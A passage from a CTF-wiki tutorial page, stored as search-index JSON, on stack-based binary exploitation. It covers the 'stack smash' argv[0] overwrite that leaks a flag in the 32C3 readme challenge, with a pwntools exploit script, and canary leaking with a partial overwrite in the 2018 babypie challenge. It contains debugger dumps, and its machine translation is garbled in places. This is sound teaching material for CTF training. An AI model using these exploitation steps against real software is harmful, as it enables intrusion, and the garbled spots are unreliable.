smash","text":""},{"location":"pwn/linux/stackoverflow/fancy-rop/#principle_2","title":"Principle","text":"<p>After the program is added with canary protection, if the buffer we read overwrites the corresponding value, the program will report an error, and generally we will not care about the error message. The stack smash trick is to use the program that prints this information to get what we want. This is because after the program starts canary protection, if the canary is found to be modified, the program will execute the <code>__stack_chk_fail</code> function to print the string pointed to by the argv[0] pointer. Normally, this pointer points to the program name. Its code is as follows</p> <pre><code>void __attribute__ ((noreturn)) __stack_chk_fail (void)\n\n{\n\n  __fortify_fail (\"stack smashing detected\");\n\n}\n\nvoid __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)\n\n{\n\n  /* The loop is added only to keep gcc happy.  */\n\n  while (1)\n\n    __libc_message (2, \"*** %s ***: %s terminated\\n\",\n\n                    msg, __libc_argv[0] ?: \"&lt;unknown&gt;\");\n\n}\n</code></pre> <p>So if we use stack overflow to override argv[0] for the address of the string we want to output, then we will output the information we want in the <code>__fortify_fail</code> function.</p>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#32c3-ctf-readme","title":"32C3 CTF readme","text":"<p>Here, we introduce the 2015 32C3 CTF readme as an example, which is reproduced on jarvisoj.</p>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#determining-protection","title":"Determining protection","text":"<p>It can be seen that the program is 64-bit, mainly enabling Canary protection and NX protection, as well as FORTIFY protection.</p> <pre><code>\u279c  stacksmashes git:(master) \u2717 checksec smashes\n\n    Arch:     amd64-64-little\n\n    RELRO:    No RELRO\n\n    Stack:    Canary found\n\n    NX:       NX enabled\n\n    PIE:      No PIE (0x400000)\n\n    FORTIFY:  Enabled\n</code></pre>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#_3","title":"\u5206\u6790\u7a0b\u5e8f","text":"<p>Ida look</p> <pre><code>__int64 sub_4007E0()\n\n{\n\n__int64 v0; // rax @ 1\n  __int64 v1; // rbx@2\n\n  int v2; // eax@3\n\n__int64 v4; // [sp + 0h] [bp-128h] @ 1\n  __int64 v5; // [sp+108h] [bp-20h]@1\n\n\n\n  v5 = *MK_FP(__FS__, 40LL);\n\n  __printf_chk(1LL, (__int64)\"Hello!\\nWhat's your name? \");\n\nLODWORD (v0) = _IO_gets ((__ int64) &amp;amp; v4);\n  if ( !v0 )\n\nLABEL_9:\n\n    _exit(1);\n\n  v1 = 0LL;\n\n  __printf_chk(1LL, (__int64)\"Nice to meet you, %s.\\nPlease overwrite the flag: \");\n\n  while ( 1 )\n\n  {\n\n    v2 = _IO_getc(stdin);\n\n    if ( v2 == -1 )\n\n      goto LABEL_9;\n\n    if ( v2 == '\\n' )\n\n      break;\n\n    byte_600D20[v1++] = v2;\n\n    if ( v1 == ' ' )\n\n      goto LABEL_8;\n\n  }\n\n  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));\n\nLABEL_8:\n\n  puts(\"Thank you, bye!\");\n\n  return *MK_FP(__FS__, 40LL) ^ v5;\n\n}\n</code></pre> <p>Obviously, the program has a stack overflow in <code>_IO_gets((__int64)&amp;amp;v4)</code>;</p> <p>In addition, the program also prompts to overwrite the flag. And found that the program is very interesting to execute this statement after the while loop</p> <pre><code>  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));\n</code></pre> <p>Looking at the contents of the corresponding address, you can find the following content, indicating that the flag of the program is here.</p> <pre><code>.data:0000000000600D20 ; char aPctfHereSTheFl[]\n\n.data:0000000000600D20 aPctfHereSTheFl db 'PCTF{Here',27h,'s the flag on server}',0\n</code></pre> <p>But if we directly use the stack overflow to output the contents of the address is not feasible, this is because the content we read <code>byte_600D20[v1++] = v2;</code> is exactly the block memory, which will directly overwrite it, this We need to use a skill.</p> <ul> <li>When ELF memory maps, the bss section is mapped twice, so we can use another address for output, which can be found using gdb's find.</li> </ul>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#determine-the-flag-address","title":"Determine the flag address","text":"<p>We download the breakpoint from the memset function and read the corresponding content as follows</p> <p><code>`</code>asm gef\u27a4  c</p> <p>Continuing.</p> <p>Hello!</p> <p>What's your name? qqqqqqq</p> <p>Nice to meet you, qqqqqqq.</p> <p>Please overwrite the flag: 222222222</p> <p>Breakpoint 1, __memset_avx2 () at ../sysdeps/x86_64/multiarch/memset-avx2.S:38</p> <p>38 ../sysdeps/x86_64/multiarch/memset-avx2.S: There is no such file or directory. \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500</p> <p>0x7ffff7b7f920 &lt;__memset_chk_avx2+0&gt; cmp    rcx, rdx</p> <p>0x7ffff7b7f923 &lt;__memset_chk_avx2+3&gt; jb     0x7ffff7b24110 &lt;__GI___chk_fail&gt;</p> <p>0x7ffff7b7f929                  nop    DWORD PTR [rax+0x0]</p> <p>\u2192 0x7ffff7b7f930 &lt;__memset_avx2+0&gt; vpxor  xmm0, xmm0, xmm0</p> <p>0x7ffff7b7f934 &lt;__memset_avx2+4&gt; vmovd  xmm1, esi</p> <p>0x7ffff7b7f938 &lt;__memset_avx2+8&gt; lea    rsi, [rdi+rdx*1]    0x7ffff7b7f93c &lt;__memset_avx2+12&gt; mov    rax, rdi</p> <p>\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500</p> <p>['0x7fffffffda38', 'l8']</p> <p>8</p> <p>0x00007fffffffda38\u2502+0x00: 0x0000000000400878  \u2192   mov edi, 0x40094e  \u2190 $rsp</p> <p>0x00007fffffffda40\u2502+0x08: 0x0071717171717171 (\"qqqqqqq\"?)</p> <p>0x00007fffffffda48\u2502+0x10: 0x0000000000000000</p> <p>0x00007fffffffda50\u2502+0x18: 0x0000000000000000</p> <p>0x00007fffffffda58\u2502+0x20: 0x0000000000000000</p> <p>0x00007fffffffda60\u2502+0x28: 0x0000000000000000</p> <p>0x00007fffffffda68\u2502+0x30: 0x0000000000000000</p> <p>0x00007fffffffda70\u2502+0x38: 0x0000000000000000</p> <p>\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500</p> <p>[#0] 0x7ffff7b7f930 \u2192 Name: __memset_avx2()</p> <p>[# 1] 0x400878 \u2192 mov edi, 0x40094e \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500</p> <p>gef\u27a4  find 22222</p> <p>Argument required (expression to compute).</p> <p>gef\u27a4  find '22222'</p> <p>No symbol \"22222\" in current context.</p> <p>given grip '22222' [+] Searching '22222' in memory</p> <p>[+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x600000-0x601000), permission=rw-</p> <p>0x600d20 - 0x600d3f  \u2192   \"222222222's the flag on server}\" </p> <p>[+] In '[heap]'(0x601000-0x622000), permission=rw-</p> <p>0x601010 - 0x601019  \u2192   \"222222222\" </p> <p>donated PCTF [+] Searching 'PCTF' in memory</p> <p>[+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x400000-0x401000), permission=r-x</p> <p>0x400d20 - 0x400d3f  \u2192   \"PCTF{Here's the flag on server}\" </p> <pre><code>It can be seen that the 2222 we read has covered the flag at 0x600d20, but we still find the backup of this flag at 0x400d20 in memory, so we can still output it. Here we have determined the address of the flag.\n\n\n#### Determining the offset\n\n\nNext, we determine the offset of the string read by argv[0].\n\n\nFirst break the breakpoint at the main function entry, as follows\n\n\n`` `asm\ngef\u27a4  b *0x00000000004006D0\n\nBreakpoint 1 at 0x4006d0\n\ngef\u27a4  r\n\nStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes \n\n\n\nBreakpoint 1, 0x00000000004006d0 in ?? ()\n\n code:i386:x86-64 ]\u2500\u2500\u2500\u2500\n\n     0x4006c0 &lt;_IO_gets@plt+0&gt; jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 &lt;_IO_gets@got.plt&gt;\n\n     0x4006c6 &lt;_IO_gets@plt+6&gt; push   0x9\n\n     0x4006cb &lt;_IO_gets@plt+11&gt; jmp    0x400620\n\n \u2192   0x4006d0                  sub    rsp, 0x8\n\n0x4006d4 mov rdi, QWORD PTR [rip + 0x200665] # 0x600d40 &lt;stdout&gt;\n0x4006db xi, oh\n     0x4006dd                  call   0x400660 &lt;setbuf@plt&gt;\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500\n\n['0x7fffffffdb78', 'l8']\n\n8\n\n0x00007fffffffdb78\u2502+0x00: 0x00007ffff7a2d830  \u2192  &lt;__libc_start_main+240&gt; mov edi, eax    \u2190 $rsp\n\n0x00007fffffffdb80\u2502+0x08: 0x0000000000000000\n\n0x00007fffffffdb88\u2502+0x10: 0x00007fffffffdc58  \u2192  0x00007fffffffe00b  \u2192  \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/exam[...]\"\n\n0x00007fffffffdb90\u2502+0x18: 0x0000000100000000\n\n0x00007fffffffdb98\u2502+0x20: 0x00000000004006d0  \u2192   sub rsp, 0x8\n\n0x00007fffffffdba0\u2502+0x28: 0x0000000000000000\n\n0x00007fffffffdba8\u2502+0x30: 0x48c916d3cf726fe3\n\n0x00007fffffffdbb0\u2502+0x38: 0x00000000004006ee  \u2192   xor ebp, ebp\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500\n\n[#0] 0x4006d0 \u2192 sub rsp, 0x8\n\n[#1] 0x7ffff7a2d830 \u2192 Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdc48)\n\n---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---\n\n[# 2] 0x400717 \u2192 holds\n</code></pre> <p>It can be seen that 0x00007fffffffe00b points to the program name, which is naturally argv[0], so the content we modified is this address. At the same time, the address is kept at 0x00007fffffffdc58, so the address we really need is 0x00007fffffffdc58.</p> <p>Also, according to the assembly code</p> <p><code>`</code>asm .text:00000000004007E0                 push    rbp</p> <p>.text:00000000004007E1                 mov     esi, offset aHelloWhatSYour ; \"Hello!\\nWhat's your name? \"</p> <p>.text:00000000004007E6                 mov     edi, 1</p> <p>.text:00000000004007EB                 push    rbx</p> <p>.text:00000000004007EC                 sub     rsp, 118h</p> <p>.text:00000000004007F3                 mov     rax, fs:28h</p> <p>.text:00000000004007FC                 mov     [rsp+128h+var_20], rax</p> <p>.text:0000000000400804                 xor     eax, eax</p> <p>.text:0000000000400806                 call    ___printf_chk</p> <p>.text:000000000040080B                 mov     rdi, rsp</p> <p>.text:000000000040080E                 call    __IO_gets</p> <pre><code>We can make sure that the starting address of the string we read is actually the rsp before calling `__IO_gets`, so we put the breakpoint at the call, as follows\n\n\n`` `asm\ngef\u27a4  b *0x000000000040080E\n\nBreakpoint 2 at 0x40080e\n\ngef\u27a4  c\n\nContinuing.\n\nHello!\n\nWhat's your name? \n\nBreakpoint 2, 0x000000000040080e in ?? ()\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500\n\n     0x400804                  xor    eax, eax\n\n     0x400806                  call   0x4006b0 &lt;__printf_chk@plt&gt;\n\n     0x40080b                  mov    rdi, rsp\n\n \u2192   0x40080e                  call   0x4006c0 &lt;_IO_gets@plt&gt;\n\n   \u21b3    0x4006c0 &lt;_IO_gets@plt+0&gt; jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 &lt;_IO_gets@got.plt&gt;\n\n        0x4006c6 &lt;_IO_gets@plt+6&gt; push   0x9\n\n        0x4006cb &lt;_IO_gets@plt+11&gt; jmp    0x400620\n\n        0x4006d0                  sub    rsp, 0x8\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500\n\n['0x7fffffffda40', 'l8']\n\n8\n\n0x00007fffffffda40\u2502+0x00: 0x0000ff0000000000     \u2190 $rsp, $rdi\n\n0x00007fffffffda48\u2502+0x08: 0x0000000000000000\n\n0x00007fffffffda50\u2502+0x10: 0x0000000000000000\n\n0x00007fffffffda58\u2502+0x18: 0x0000000000000000\n\n0x00007fffffffda60\u2502+0x20: 0x0000000000000000\n\n0x00007fffffffda68\u2502+0x28: 0x0000000000000000\n\n0x00007fffffffda70\u2502+0x30: 0x0000000000000000\n\n0x00007fffffffda78\u2502+0x38: 0x0000000000000000\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500\n\n[#0] 0x40080e \u2192 call 0x4006c0 &lt;_IO_gets@plt&gt;\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\ngef\u27a4  print $rsp\n\n$1 = (void *) 0x7fffffffda40\n</code></pre> <p>It can be seen that the value of rsp is 0x7fffffffda40, then the relative offset is</p> <pre><code>&gt;&gt;&gt; 0x00007fffffffdc58-0x7fffffffda40\n\n536\n\n&gt;&gt;&gt; hex(536)\n\n'0x218'\n</code></pre>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#using-the-program","title":"Using the program","text":"<p>We construct the application as follows</p> <pre><code>from pwn import *\n\ncontext.log_level = 'debug'\n\nsmash = ELF('./smashes')\n\nif args['REMOTE']:\n\n    sh = remote('pwn.jarvisoj.com', 9877)\n\nelse:\n\n    sh = process('./smashes')\n\nargv_addr = 0x00007fffffffdc58\n\nname_addr = 0x7fffffffda40\n\nflag_addr = 0x600D20\n\nanother_flag_addr = 0x400d20\n\npayload = 'a' * (argv_addr - name_addr) + p64(another_flag_addr)\n\nsh.recvuntil('name? ')\n\nsh.sendline(payload)\n\nsh.recvuntil('flag: ')\n\nsh.sendline ( &amp;#39;bb&amp;#39;)\ndata = sh.recv()\n\nsh.interactive()\n</code></pre> <p>Here we get the flag directly, there is no online saying that the flag is not available.</p>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#title_1","title":"Title","text":"<ul> <li>2018 Net Ding Cup - guess</li> </ul>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#partial-overwrite-on-the-stack","title":"partial overwrite on the stack","text":"<p>Partial overwrite This technique is applicable in many places. Here we use the partial overwrite on the stack as an example to introduce this idea.</p> <p>We know that after randomization (ASLR, PIE) is turned on, the lower 12-bit page offset is always fixed regardless of the high-order address, which means that if we can change the low-order offset, we can Control the execution flow of the program to some extent, bypassing PIE protection.</p>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#2018-babypie","title":"2018-\u5b89\u6052\u676f-babypie","text":"<p>Taking the babypie of the Anheng Cup in July 2018 as an example, this kind of utilization technique is analyzed. The binary of the topic is placed in [ctf-challenge] (https://github.com/ctf-wiki/ctf-challenges/tree/ Master/pwn/stackoverflow/partial_overwrite)</p>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#determining-protection_1","title":"Determining protection","text":"<pre><code>babypie: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=77a11dbd367716f44ca03a81e8253e14b6758ac3, stripped\n\n[*] '/home/m4x/pwn_repo/LinkCTF_2018.7_babypie/babypie'\n\n    Arch:     amd64-64-little\n\n    RELRO:    Partial RELRO\n\n    Stack:    Canary found\n\n    NX:       NX enabled\n\n    PIE:      PIE enabled\n</code></pre> <p>64-bit dynamically linked file with PIE protection and stack overflow protection enabled</p>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#_4","title":"\u5206\u6790\u7a0b\u5e8f","text":"<p>Looking at IDA, it is easy to find the vulnerability point. There are obvious stack overflow vulnerabilities in both inputs. It should be noted that before the input, the program clears the stack space, so we cannot pass the print stack. Information comes to the base of leak binary or libc <pre><code>__int64 sub_960 ()\n{\n\n  char buf[40]; // [rsp+0h] [rbp-30h]\n\n  unsigned __int64 v2; // [rsp+28h] [rbp-8h]\n\n\n\n  v2 = __readfsqword(0x28u);\n\n  setvbuf(stdin, 0LL, 2, 0LL);\n\n  setvbuf(_bss_start, 0LL, 2, 0LL);\n\n* (_ OWORD *) buf = 0uLL;\n* (_ OWORD *) &amp;amp; buf [16] = 0uLL;\n  puts(\"Input your Name:\");\n\n  read(0, buf, 0x30uLL);                        // overflow\n\n  printf(\"Hello %s:\\n\", buf, *(_QWORD *)buf, *(_QWORD *)&amp;buf[8], *(_QWORD *)&amp;buf[16], *(_QWORD *)&amp;buf[24]);\n\n  read(0, buf, 0x60uLL);                        // overflow\n\n  return 0LL;\n\n}\n</code></pre></p> <p>Also found that the program gives a function that can directly get the shell <code>`</code>asm .text:0000000000000A3E getshell        proc near</p> <p>.text:0000000000000A3E ; __unwind { .text:0000000000000A3E                 push    rbp</p> <p>.text:0000000000000A3F                 mov     rbp, rsp</p> <p>.text:0000000000000A42                 lea     rdi, command    ; \"/bin/sh\"</p> <p>.text:0000000000000A49                 call    _system</p> <p>.text:0000000000000A4E                 nop</p> <p>.text:0000000000000A4F                 pop     rbp</p> <p>.text: 0000000000000A50 retn .text:0000000000000A50 ; } // starts at A3E</p> <p>.text:0000000000000A50 getshell        endp</p> <pre><code>So we just have to control rip to this function.\n\n\n#### leak canary\n\nThere is an output immediately after the first read, and read does not add \\0 to the end of the input, which gives us the opportunity to leak the contents of the stack.\n\n\nIn order to control the return address for the second overflow, we choose leak canary. It can be calculated that the length of the first read is 0x30 - 0x8 + 1 (+ 1 is to cover the value of the lowest bit of canary is non-zero, printf uses % s, when the end of \\0 is encountered, when the canary low is over non-zero, canary can be printed by printf)\n\n\n`` `asm\nBreakpoint 1, 0x0000557c8443aa08 in ?? ()\n\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n RAX  0x0\n\n RBX  0x0\n\n RCX  0x7f1898a64690 (__read_nocancel+7) \u25c2\u2014 cmp    rax, -0xfff\n\n RDX  0x30\n\n RDI  0x557c8443ab15 \u25c2\u2014 insb   byte ptr [rdi], dx /* 'Hello %s:\\n' */\n\n RSI  0x7ffd97aa0410 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa')\n\n R8   0x7f1898f1d700 \u25c2\u2014 0x7f1898f1d700\n\n R9   0x7f1898f1d700 \u25c2\u2014 0x7f1898f1d700\n\n R10  0x37b\n\n R11  0x246\n\n R12  0x557c8443a830 \u25c2\u2014 xor    ebp, ebp\n\n R13  0x7ffd97aa0540 \u25c2\u2014 0x1\n\n R14  0x0\n\n R15  0x0\n\n RBP  0x7ffd97aa0440 \u2014\u25b8 0x7ffd97aa0460 \u2014\u25b8 0x557c8443aa80 \u25c2\u2014 push   r15\n\n RSP  0x7ffd97aa0410 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa')\n\n RIP  0x557c8443aa08 \u25c2\u2014 call   0x557c8443a7e0\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500 [DISASM] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba 0x557c8443aa08    call   0x557c8443a7e0\n\n\n\n   0x557c8443aa0d    lea    rax, [rbp - 0x30]\n\n   0x557c8443aa11    mov    edx, 0x60\n\n   0x557c8443aa16    mov    rsi, rax\n0x557c8443aa19 mov edi, 0\n   0x557c8443aa1e    call   0x557c8443a7f0\n\n\n\n   0x557c8443aa23    mov    eax, 0\n\n0x557c8443aa28 mov rcx, qword ptr [rbp - 8]\n   0x557c8443aa2c    xor    rcx, qword ptr fs:[0x28]\n\n   0x557c8443aa35    je     0x557c8443aa3c\n\n\n\n   0x557c8443aa37    call   0x557c8443a7c0\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n00:0000\u2502 rsi rsp  0x7ffd97aa0410 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa')\n\n... \u2193\n\n05:0028\u2502          0x7ffd97aa0438 \u25c2\u2014 0xb3012605fc402a61\n\n06:0030\u2502 rbp      0x7ffd97aa0440 \u2014\u25b8 0x7ffd97aa0460 \u2014\u25b8 0x557c8443aa80 \u25c2\u2014 push   r15\n\n07:0038\u2502          0x7ffd97aa0448 \u2014\u25b8 0x557c8443aa6a \u25c2\u2014 mov    eax, 0\n\nBreakpoint *(0x557c8443a000+0xA08)\n\npwndbg&gt; canary\n\n$1 = 0\n\ncanary : 0xb3012605fc402a00\n\npwndbg&amp;gt;\n</code></pre> <p>Canary In the rbp - 0x8 position, it can be seen that the lower bit of the canary has been overwritten to 0x61, so as long as the 7 bits after 'a' * (0x30 - 0x8 + 1) are received, plus the lowest bit ' 0', we will recover the canary of the program.</p>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#override-return-address","title":"Override return address","text":"<p>With canary, you can overwrite the return address with the second stack overflow, and control the return address to the getshell function. Let's first look at the return address when there is no overflow.</p> <p><code>`</code>asm 0x000055dc43694a1e in ?? ()</p> <p>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</p> <p>\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500</p> <p>RAX  0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa')</p> <p>RBX  0x0</p> <p>RCX  0x7f206c6696f0 (__write_nocancel+7) \u25c2\u2014 cmp    rax, -0xfff</p> <p>RDX  0x60</p> <p>RDI  0x0</p> <p>RSI  0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa')</p> <p>R8   0x7f206cb22700 \u25c2\u2014 0x7f206cb22700</p> <p>R9   0x3e</p> <p>R10  0x73</p> <p>R11  0x246</p> <p>R12  0x55dc43694830 \u25c2\u2014 xor    ebp, ebp</p> <p>R13  0x7fff9aa3b050 \u25c2\u2014 0x1</p> <p>R14  0x0</p> <p>R15  0x0</p> <p>RBP  0x7fff9aa3af50 \u2014\u25b8 0x7fff9aa3af70 \u2014\u25b8 0x55dc43694a80 \u25c2\u2014 push   r15</p> <p>RSP  0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa')</p> <p>RIP  0x55dc43694a1e \u25c2\u2014 call   0x55dc436947f0</p> <p>\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500 [DISASM] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 